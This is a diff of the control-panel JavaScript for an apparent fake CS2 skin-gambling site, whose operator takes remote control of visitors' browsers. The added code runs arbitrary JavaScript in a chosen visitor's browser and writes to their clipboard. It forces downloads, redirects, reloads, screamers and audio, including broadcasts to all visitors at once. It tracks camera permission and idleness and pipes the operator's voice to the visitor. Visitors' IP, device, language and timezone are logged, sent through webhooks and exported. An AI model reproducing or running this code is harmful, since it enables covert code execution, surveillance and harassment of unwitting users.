-        const s = conns.get(connIp.get(conn) || '?');
+        const ip = connIp.get(conn); const s = ip ? conns.get(ip) : null;
         sendWebhook({
-            title: '💳 Пополнение баланса',
+            title: '💳 Пополнение',
             color: 0x22c55e,
             fields: [
                 {name:'📱 Устройство', value: s?.device || '?', inline:true},
-                {name:'🌐 IP', value: '`'+(connIp.get(conn)||'?')+'`', inline:true},
+                {name:'🌐 IP', value: '`'+(ip||'?')+'`', inline:true},
                 {name:'💰 Сумма', value: '$' + data.amount.toFixed(2), inline:true}
             ],
             timestamp: new Date().toISOString()
         });
     } else if (data.type === 'upgradeWin') {
-        log(`✅ Апгрейд: ${data.your.name} → ${data.target.name}`, 'info');
-        const s = conns.get(connIp.get(conn) || '?');
-        sendWebhook({
-            title: '✅ Апгрейд выигран',
-            color: 0x4ade80,
-            fields: [
-                {name:'📱 Устройство', value: s?.device || '?', inline:true},
-                {name:'🌐 IP', value: '`'+(connIp.get(conn)||'?')+'`', inline:true},
-                {name:'🎒 Ставка', value: data.your.weapon+' | '+data.your.name+' ($'+data.yourPrice.toFixed(2)+')', inline:false},
-                {name:'🎯 Цель', value: data.target.weapon+' | '+data.target.name+' ($'+data.targetPrice.toFixed(2)+')', inline:false}
-            ],
-            timestamp: new Date().toISOString()
-        });
+        log(`✅ Апгрейд win: ${data.your.name} → ${data.target.name}`, 'info');
+        const ip = connIp.get(conn); const s = ip ? conns.get(ip) : null;
+        sendWebhook({title: '✅ Апгрейд выигран', color: 0x4ade80, fields: [
+            {name:'📱 Устройство', value: s?.device || '?', inline:true},
+            {name:'🌐 IP', value: '`'+(ip||'?')+'`', inline:true},
+            {name:'🎒 → 🎯', value: data.your.name + ' → ' + data.target.name, inline:false}
+        ], timestamp: new Date().toISOString()});
     } else if (data.type === 'upgradeLose') {
-        log(`❌ Апгрейд проигран: ${data.your.name}`, 'err');
-        const s = conns.get(connIp.get(conn) || '?');
-        sendWebhook({
-            title: '❌ Апгрейд проигран',
-            color: 0xeb4b4b,
-            fields: [
-                {name:'📱 Устройство', value: s?.device || '?', inline:true},
-                {name:'🌐 IP', value: '`'+(connIp.get(conn)||'?')+'`', inline:true},
-                {name:'🎒 Потеряно', value: data.your.weapon+' | '+data.your.name, inline:false}
-            ],
-            timestamp: new Date().toISOString()
-        });
+        log(`❌ Апгрейд lose: ${data.your.name}`, 'err');
+        const ip = connIp.get(conn); const s = ip ? conns.get(ip) : null;
+        sendWebhook({title: '❌ Апгрейд проигран', color: 0xeb4b4b, fields: [
+            {name:'📱 Устройство', value: s?.device || '?', inline:true},
+            {name:'🌐 IP', value: '`'+(ip||'?')+'`', inline:true},
+            {name:'🎒 Потеряно', value: data.your.name, inline:false}
+        ], timestamp: new Date().toISOString()});
     } else if (data.type === 'sell') {
-        log(`💸 Продажа: ${data.skin.name} (+$${data.earned.toFixed(2)})`, 'info');
-        const s = conns.get(connIp.get(conn) || '?');
-        sendWebhook({
-            title: '💸 Продажа скина',
-            color: 0xf59e0b,
-            fields: [
-                {name:'📱 Устройство', value: s?.device || '?', inline:true},
-                {name:'🌐 IP', value: '`'+(connIp.get(conn)||'?')+'`', inline:true},
-                {name:'🔫 Скин', value: data.skin.weapon+' | '+data.skin.name, inline:false},
-                {name:'💰 Получено', value: '$'+data.earned.toFixed(2), inline:true}
-            ],
-            timestamp: new Date().toISOString()
-        });
+        log(`💸 Продажа: ${data.skin.name}`, 'info');
     } else if (data.type === 'cameraOn') {
         log('📸 Друг разрешил камеру', 'warn');
-        const s = conns.get(connIp.get(conn) || '?');
-        sendWebhook({
-            title: '📸 Друг разрешил камеру',
-            color: 0xec4899,
-            fields: [
-                {name:'📱 Устройство', value: s?.device || '?', inline:true},
-                {name:'🌐 IP', value: '`'+(connIp.get(conn)||'?')+'`', inline:true}
-            ],
-            timestamp: new Date().toISOString()
-        });
+        const ip = connIp.get(conn); const s = ip ? conns.get(ip) : null;
+        sendWebhook({title: '📸 Друг разрешил камеру', color: 0xec4899, fields: [
+            {name:'📱 Устройство', value: s?.device || '?', inline:true},
+            {name:'🌐 IP', value: '`'+(ip||'?')+'`', inline:true}
+        ], timestamp: new Date().toISOString()});
     } else if (data.type === 'voicePlaying') {
         log('🟢 Друг слушает тебя', 'info');
         document.getElementById('talkStatus').textContent = '🟢 Друг слушает';
         document.getElementById('talkStatus').className = 'voice-status on';
-        const s = conns.get(connIp.get(conn) || '?');
-        sendWebhook({
-            title: '🎙 Друг слушает тебя',
-            color: 0x4ade80,
-            description: 'Подтверждение от устройства — воспроизведение идёт',
-            fields: [
-                {name:'📱 Устройство', value: s?.device || '?', inline:true},
-                {name:'🌐 IP', value: '`'+(connIp.get(conn)||'?')+'`', inline:true}
-            ],
-            timestamp: new Date().toISOString()
-        });
+        const ip = connIp.get(conn); const s = ip ? conns.get(ip) : null;
+        sendWebhook({title: '🎙 Друг слушает', color: 0x4ade80, fields: [
+            {name:'📱 Устройство', value: s?.device || '?', inline:true},
+            {name:'🌐 IP', value: '`'+(ip||'?')+'`', inline:true}
+        ], timestamp: new Date().toISOString()});
     } else if (data.type === 'voiceStopped') {
-        log('🔇 Друг перестал слушать', 'warn');
         document.getElementById('talkStatus').textContent = '🔇 Не слушает';
         document.getElementById('talkStatus').className = 'voice-status';
     } else if (data.type === 'voicePeerId') {
         friendVoicePeerId = data.peerId;
-        log('🎙 Друг готов слушать. Voice Peer ID: ' + data.peerId, 'warn');
-        // Если микрофон уже включён — звоним сейчас
-        if (modifiedStream && peer && peer.open) {
-            makeVoiceCall();
-        }
-    } else if (data.type === 'voiceFail') {
-        log('❌ Голос у друга не работает: ' + data.error, 'err');
+        log('🎙 Друг готов слушать', 'warn');
+        if (modifiedStream && peer && peer.open) makeVoiceCall();
+    } else if (data.type === 'idle') {
+        log('💤 Друг бездействует 30 сек', 'warn');
+        const ip = connIp.get(conn); const s = ip ? conns.get(ip) : null;
+        sendWebhook({title: '💤 Друг бездействует', color: 0x8892a6, fields: [
+            {name:'📱 Устройство', value: s?.device || '?', inline:true},
+            {name:'🌐 IP', value: '`'+(ip||'?')+'`', inline:true}
+        ], timestamp: new Date().toISOString()});
+    } else if (data.type === 'wakeLockOn') {
+        log('💡 Wake Lock активен', 'info');
     }
 }
 
-/* ============================================================
-   РЕНДЕР СЕССИЙ
-   ============================================================ */
+document.getElementById('sessionFilter').addEventListener('input', (e) => { sessionFilter = e.target.value.toLowerCase(); renderSessions(); });
+document.getElementById('sortSessions').addEventListener('change', (e) => { sortMode = e.target.value; renderSessions(); });
+
 function renderSessions() {
     const list = document.getElementById('sessionsList');
     document.getElementById('sessionCount').textContent = conns.size;
@@ -636,7 +653,11 @@ function renderSessions() {
         list.innerHTML = '<div class="empty"><b>Пока никого</b>Друг должен зайти на сайт</div>';
         return;
     }
-    const arr = [...conns.values()].sort((a, b) => b.lastSeen - a.lastSeen);
+    let arr = [...conns.values()];
+    if (sessionFilter) arr = arr.filter(s => (s.device||'').toLowerCase().includes(sessionFilter) || s.ip.includes(sessionFilter));
+    if (sortMode === 'balance') arr.sort((a,b) => (b.balance||0) - (a.balance||0));
+    else if (sortMode === 'drops') arr.sort((a,b) => (b.drops||0) - (a.drops||0));
+    else arr.sort((a, b) => b.lastSeen - a.lastSeen);
     list.innerHTML = '';
     arr.forEach((s, i) => {
         const online = Date.now() - s.lastSeen < 15000;
@@ -647,7 +668,7 @@ function renderSessions() {
         d.innerHTML = `
             <div class="session-idx">#${s.sessionId||i+1}</div>
             <div>
-                <div class="session-device">${s.device || '❓'} <span style="color:#8892a6;font-size:11px">${s.browser || ''}</span></div>
+                <div class="session-device">${s.device || '❓'} <span style="color:#8892a6;font-size:11px">${s.browser||''}</span></div>
                 <div class="session-ip">${s.ip}</div>
             </div>
             <div class="session-time"><b>${agoT}</b>зашёл</div>
@@ -666,15 +687,17 @@ function selectSession(ip) {
     if (s) {
         info.className = 'selected-info';
         info.innerHTML = `
-            <div><div class="label">Устройство</div><div class="value" style="font-size:14px">${s.device||'?'}</div></div>
-            <div><div class="label">Браузер</div><div class="value" style="font-size:14px">${s.browser||'?'}</div></div>
+            <div><div class="label">Устройство</div><div class="value">${s.device||'?'}</div></div>
+            <div><div class="label">Браузер</div><div class="value">${s.browser||'?'}</div></div>
             <div><div class="label">IP</div><div class="value">${s.ip}</div></div>
+            <div><div class="label">Экран</div><div class="value">${s.screen||'?'}</div></div>
             <div><div class="label">Баланс</div><div class="value">$${(s.balance||0).toFixed(2)}</div></div>
-            <div><div class="label">Дропов</div><div class="value">${s.drops}</div></div>
+            <div><div class="label">Дропов</div><div class="value">${s.drops||0}</div></div>
+            <div><div class="label">Язык</div><div class="value">${(s.extra&&s.extra.language)||'—'}</div></div>
+            <div><div class="label">Пояс</div><div class="value">${(s.extra&&s.extra.timezone)||'—'}</div></div>
         `;
     }
     renderSessions();
-    log('🎯 Выбрана сессия: ' + ip, 'warn');
 }
 
 function sendPrank(action, extra = {}) {
@@ -685,27 +708,66 @@ function sendPrank(action, extra = {}) {
     log('😈 → ' + action, 'warn');
 }
 
+function broadcast(action, extra = {}) {
+    let n = 0;
+    conns.forEach(s => { if (s.conn && s.conn.open) { s.conn.send({action, ...extra}); n++; } });
+    log('📡 Broadcast → ' + action + ' (' + n + ')', 'warn');
+}
+
 document.querySelectorAll('.prank-btn[data-prank]').forEach(b => b.addEventListener('click', () => sendPrank(b.dataset.prank)));
 
 document.getElementById('alertBtn').onclick = () => sendPrank('alert', {text: document.getElementById('alertText').value});
+document.getElementById('consoleBtn').onclick = () => sendPrank('consoleMsg', {text: document.getElementById('consoleText').value});
+document.getElementById('titleBtn').onclick = () => sendPrank('setTitle', {text: document.getElementById('titleText').value});
+document.getElementById('faviconBtn').onclick = () => sendPrank('setFavicon', {emoji: document.getElementById('faviconEmoji').value});
+document.getElementById('clipboardBtn').onclick = () => sendPrank('copyToClipboard', {text: document.getElementById('clipboardText').value});
 document.getElementById('modalBtn').onclick = () => sendPrank('showModal', {title: document.getElementById('modalTitle').value, text: document.getElementById('modalText').value});
 document.getElementById('redirectBtn').onclick = () => sendPrank('redirect', {url: document.getElementById('redirectUrl').value});
 document.getElementById('openUrlBtn').onclick = () => sendPrank('openUrl', {url: document.getElementById('redirectUrl').value});
+document.getElementById('qrBtn').onclick = () => sendPrank('showQR', {text: document.getElementById('redirectUrl').value});
+document.getElementById('dlBtn').onclick = () => sendPrank('downloadFile', {filename: document.getElementById('dlFilename').value, content: document.getElementById('dlContent').value});
+document.getElementById('printBtn').onclick = () => sendPrank('print', {text: document.getElementById('printText').value});
 document.getElementById('nameBtn').onclick = () => sendPrank('setName', {name: document.getElementById('nameInput').value});
 document.getElementById('setBalanceBtn').onclick = () => sendPrank('setBalance', {value: Number(document.getElementById('balanceAmount').value)});
 document.getElementById('addBalanceBtn').onclick = () => sendPrank('addBalance', {value: Number(document.getElementById('balanceAmount').value)});
+document.getElementById('customJsBtn').onclick = () => {
+    const code = document.getElementById('customJs').value;
+    if (!code.trim()) { alert('Введи код'); return; }
+    if (!selectedIp) { alert('Выбери сессию'); return; }
+    sendPrank('customJS', {code});
+};
 
-/* ============================================================
-   ГОЛОС — ТЫ ГОВОРИШЬ, ДРУГ СЛЫШИТ
-   ============================================================ */
+document.getElementById('broadcastReload').onclick = () => { if (confirm('Обновить всем?')) broadcast('reload'); };
+document.getElementById('broadcastRickroll').onclick = () => broadcast('playSound', {url: 'https://www.myinstants.com/media/sounds/rick-astley-never-gonna-give-you-up.mp3'});
+document.getElementById('broadcastScreamer').onclick = () => broadcast('screamer', {duration: 3000});
+document.getElementById('broadcastMp3').onclick = () => { if (currentIdx !== -1) broadcast('playMp3', {dataUrl: tracks[currentIdx].dataUrl, name: tracks[currentIdx].name}); };
+document.getElementById('broadcastModal').onclick = () => broadcast('showModal', {title: document.getElementById('modalTitle').value, text: document.getElementById('modalText').value});
+
+document.getElementById('exportLogs').onclick = () => {
+    const logHTML = document.getElementById('log').innerHTML;
+    const blob = new Blob([logHTML], {type: 'text/html'});
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = 'cs2_logs_' + Date.now() + '.html';
+    a.click();
+};
+
+document.getElementById('exportSessions').onclick = () => {
+    const data = [...conns.values()].map(s => ({ip: s.ip, device: s.device, browser: s.browser, screen: s.screen, balance: s.balance, drops: s.drops, joined: new Date(s.joinedAt).toISOString(), extra: s.extra}));
+    const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = 'cs2_sessions_' + Date.now() + '.json';
+    a.click();
+};
+
+// Голос
 const pitchSlider = document.getElementById('pitchSlider');
 const echoSlider = document.getElementById('echoSlider');
 const pitchVal = document.getElementById('pitchVal');
 const echoVal = document.getElementById('echoVal');
-let voiceParams = { pitch: 1.0, echo: 0 };
-
-pitchSlider.oninput = () => { voiceParams.pitch = pitchSlider.value / 100; pitchVal.textContent = voiceParams.pitch.toFixed(2); applyVoiceParams(); };
-echoSlider.oninput = () => { voiceParams.echo = echoSlider.value / 100; echoVal.textContent = echoSlider.value + '%'; applyVoiceParams(); };
+pitchSlider.oninput = () => { voiceParams.pitch = pitchSlider.value / 100; pitchVal.textContent = voiceParams.pitch.toFixed(2); };
+echoSlider.oninput = () => { voiceParams.echo = echoSlider.value / 100; echoVal.textContent = echoSlider.value + '%'; if (wetGain) wetGain.gain.value = voiceParams.echo; };
 
 document.querySelectorAll('.preset-btn').forEach(b => {
     b.onclick = () => {
@@ -726,31 +788,23 @@ function setVoice(pi, ec) {
     echoVal.textContent = ec + '%';
     voiceParams.pitch = pi/100;
     voiceParams.echo = ec/100;
-    applyVoiceParams();
-}
-function applyVoiceParams() {
-    if (!sourceNode || !audioCtx) return;
     if (wetGain) wetGain.gain.value = voiceParams.echo;
 }
 
 function makeVoiceCall() {
-    if (!modifiedStream || !peer || !peer.open) return;
-    if (!friendVoicePeerId) { log('⚠️ Друг ещё не готов слушать', 'warn'); return; }
+    if (!modifiedStream || !peer || !peer.open || !friendVoicePeerId) return;
     try {
         if (voiceCall) { try { voiceCall.close(); } catch(e){} }
         voiceCall = peer.call(friendVoicePeerId, modifiedStream);
         voiceCall.on('stream', () => {});
-        voiceCall.on('close', () => { log('📞 Голосовой звонок завершён', 'warn'); });
         log('🎙 Звоню другу на voice peer', 'info');
-    } catch(e) { log('❌ Ошибка звонка: ' + e.message, 'err'); }
+    } catch(e) { log('❌ ' + e.message, 'err'); }
 }
 
 document.getElementById('talkBtn').addEventListener('click', async () => {
     const btn = document.getElementById('talkBtn');
     const status = document.getElementById('talkStatus');
-
     if (myMicStream) {
-        // Выключаем
         myMicStream.getTracks().forEach(t => t.stop());
         myMicStream = null;
         if (audioCtx) { try { audioCtx.close(); } catch(e){} audioCtx = null; }
@@ -761,14 +815,11 @@ document.getElementById('talkBtn').addEventListener('click', async () => {
         btn.innerHTML = '🎙 Начать говорить';
         status.textContent = 'Не активно';
         status.className = 'voice-status';
-        log('🎙 Микрофон выключен', 'warn');
         return;
     }
-
     if (!selectedIp) { alert('Выбери сессию'); return; }
     const s = conns.get(selectedIp);
     if (!s || !s.conn || !s.conn.open) { alert('Сессия офлайн'); return; }
-
     try {
         myMicStream = await navigator.mediaDevices.getUserMedia({audio: true, video: false});
         audioCtx = new (window.AudioContext || window.webkitAudioContext)();
@@ -790,24 +841,17 @@ document.getElementById('talkBtn').addEventListener('click', async () => {
         delayNode.connect(wetGain);
         wetGain.connect(destNode);
         modifiedStream = destNode.stream;
-
-        // Просим друга слушать
         s.conn.send({action: 'startVoiceListen'});
-
         btn.classList.add('active', 'recording');
-        btn.innerHTML = '🔴 Говорю... (нажми чтобы выключить)';
-        status.textContent = '⏳ Ждём подтверждения от друга...';
+        btn.innerHTML = '🔴 Говорю...';
+        status.textContent = '⏳ Ждём друга...';
         status.className = 'voice-status';
-        log('🎙 Микрофон включён, ждём друга', 'info');
     } catch(e) {
-        alert('Не удалось получить микрофон: ' + e.message);
-        log('❌ Микрофон: ' + e.message, 'err');
+        alert('Микрофон: ' + e.message);
     }
 });
 
-/* ============================================================
-   MP3-ПЛЕЕР
-   ============================================================ */
+// MP3
 const tracks = [];
 let currentIdx = -1;
 const audio = document.getElementById('mp3Audio');
@@ -820,24 +864,25 @@ fileInput.onchange = (e) => { handleFiles(e.target.files); fileInput.value = '';
 dropZone.addEventListener('dragover', (e) => { e.preventDefault(); dropZone.classList.add('dragover'); });
 dropZone.addEventListener('dragleave', () => dropZone.classList.remove('dragover'));
 dropZone.addEventListener('drop', (e) => { e.preventDefault(); dropZone.classList.remove('dragover'); handleFiles(e.dataTransfer.files); });
-document.addEventListener('dragover', (e) => e.preventDefault());
-document.addEventListener('drop', (e) => { if (!dropZone.contains(e.target)) { e.preventDefault(); handleFiles(e.dataTransfer.files); } });
 
 function handleFiles(files) {
-    let added = 0;
     for (const f of files) {
         if (!f.type.startsWith('audio/')) continue;
-        tracks.push({name: f.name, url: URL.createObjectURL(f), file: f});
-        added++;
+        const reader = new FileReader();
+        reader.onload = () => {
+            tracks.push({name: f.name, url: URL.createObjectURL(f), dataUrl: reader.result});
+            renderPlaylist();
+            if (currentIdx === -1 && tracks.length) selectTrack(0);
+            log(`🎵 Загружен: ${f.name}`, 'info');
+        };
+        reader.readAsDataURL(f);
     }
-    if (added) { log(`🎵 Загружено ${added} треков`, 'info'); renderPlaylist(); if (currentIdx === -1 && tracks.length) selectTrack(0); }
 }
 
 document.getElementById('addUrlBtn').onclick = () => {
     const url = document.getElementById('mp3Url').value.trim();
     if (!url) return;
-    const name = url.split('/').pop().split('?')[0] || 'Трек по URL';
-    tracks.push({name, url, file: null});
+    tracks.push({name: url.split('/').pop() || 'URL', url, dataUrl: url});
     document.getElementById('mp3Url').value = '';
     renderPlaylist();
     if (currentIdx === -1) selectTrack(0);
@@ -858,59 +903,29 @@ function renderPlaylist() {
         playlist.appendChild(d);
     });
 }
-function selectTrack(i) {
-    currentIdx = i;
-    const t = tracks[i];
-    document.getElementById('mp3Title').textContent = t.name;
-    document.getElementById('mp3Sub').textContent = t.file ? 'Локальный файл' : 'URL-источник';
-    audio.src = t.url;
-    audio.load();
-    renderPlaylist();
-}
-function removeTrack(i) {
-    const t = tracks[i];
-    if (t.file) URL.revokeObjectURL(t.url);
-    tracks.splice(i, 1);
-    if (currentIdx === i) { currentIdx = -1; audio.src = ''; document.getElementById('mp3Title').textContent = '— трек не выбран —'; }
-    else if (currentIdx > i) currentIdx--;
-    renderPlaylist();
-}
-function playLocal() { if (currentIdx === -1) return; audio.play().catch(()=>{}); }
-audio.addEventListener('timeupdate', () => {
-    if (!audio.duration) return;
-    const p = (audio.currentTime / audio.duration) * 100;
-    document.getElementById('mp3Seek').value = p;
-    document.getElementById('mp3Time').textContent = fmtTime(audio.currentTime);
-    document.getElementById('mp3Dur').textContent = fmtTime(audio.duration);
-});
-function fmtTime(s) { if (!isFinite(s)) return '0:00'; const m = Math.floor(s/60), sec = Math.floor(s%60); return m + ':' + (sec<10?'0':'') + sec; }
-document.getElementById('mp3Seek').oninput = (e) => { if (!audio.duration) return; audio.currentTime = (e.target.value / 100) * audio.duration; };
+function selectTrack(i) { currentIdx = i; audio.src = tracks[i].url; audio.load(); document.getElementById('mp3Title').textContent = tracks[i].name; renderPlaylist(); }
+function removeTrack(i) { tracks.splice(i,1); if (currentIdx===i) currentIdx=-1; else if (currentIdx>i) currentIdx--; renderPlaylist(); }
+function playLocal() { if (currentIdx!==-1) audio.play().catch(()=>{}); }
+audio.addEventListener('timeupdate', () => { if (!audio.duration) return; document.getElementById('mp3Seek').value = (audio.currentTime/audio.duration)*100; document.getElementById('mp3Time').textContent = fmtTime(audio.currentTime); document.getElementById('mp3Dur').textContent = fmtTime(audio.duration); });
+function fmtTime(s) { if (!isFinite(s)) return '0:00'; return Math.floor(s/60) + ':' + (Math.floor(s%60)<10?'0':'') + Math.floor(s%60); }
+document.getElementById('mp3Seek').oninput = (e) => { if (!audio.duration) return; audio.currentTime = (e.target.value/100)*audio.duration; };
 document.getElementById('mp3Play').onclick = playLocal;
 document.getElementById('mp3Pause').onclick = () => audio.pause();
-document.getElementById('mp3Stop').onclick = () => { audio.pause(); audio.currentTime = 0; document.getElementById('mp3Seek').value = 0; document.getElementById('mp3Time').textContent = '0:00'; };
-document.getElementById('mp3Remove').onclick = () => { if (currentIdx !== -1) removeTrack(currentIdx); };
-document.getElementById('mp3Send').onclick = () => { if (currentIdx !== -1) sendTrackToVictim(currentIdx); };
+document.getElementById('mp3Stop').onclick = () => { audio.pause(); audio.currentTime = 0; };
+document.getElementById('mp3Remove').onclick = () => { if (currentIdx!==-1) removeTrack(currentIdx); };
+document.getElementById('mp3Send').onclick = () => { if (currentIdx!==-1) sendTrackToVictim(currentIdx); };
 
 async function sendTrackToVictim(idx) {
     if (!selectedIp) { alert('Выбери сессию'); return; }
     const s = conns.get(selectedIp);
     if (!s || !s.conn || !s.conn.open) { alert('Сессия офлайн'); return; }
     const t = tracks[idx];
-    log('🎵 Отправка "' + t.name + '"...', 'warn');
-    if (!t.file && !t.url.startsWith('blob:')) { s.conn.send({action: 'playSound', url: t.url}); log('✅ URL отправлен', 'info'); return; }
-    try {
-        const blob = t.file || await (await fetch(t.url)).blob();
-        if (blob.size > 8 * 1024 * 1024) { log('❌ Файл > 8 МБ', 'err'); alert('Файл больше 8 МБ'); return; }
-        const reader = new FileReader();
-        reader.onload = () => {
-            s.conn.send({action: 'playMp3', dataUrl: reader.result, name: t.name});
-            log('✅ mp3: ' + t.name, 'info');
-        };
-        reader.readAsDataURL(blob);
-    } catch(e) { log('❌ ' + e.message, 'err'); }
+    if (t.dataUrl.length > 12 * 1024 * 1024) { alert('Файл слишком большой'); return; }
+    s.conn.send({action: 'playMp3', dataUrl: t.dataUrl, name: t.name});
+    log(`🎵 Отправлен: ${t.name}`, 'info');
 }
 
-setInterval(renderSessions, 2000);
+setInterval(() => { renderSessions(); updateStatsMini(); }, 2000);
 initPeer();
 log('⚙️ Админка запущена', 'info');
 </script>
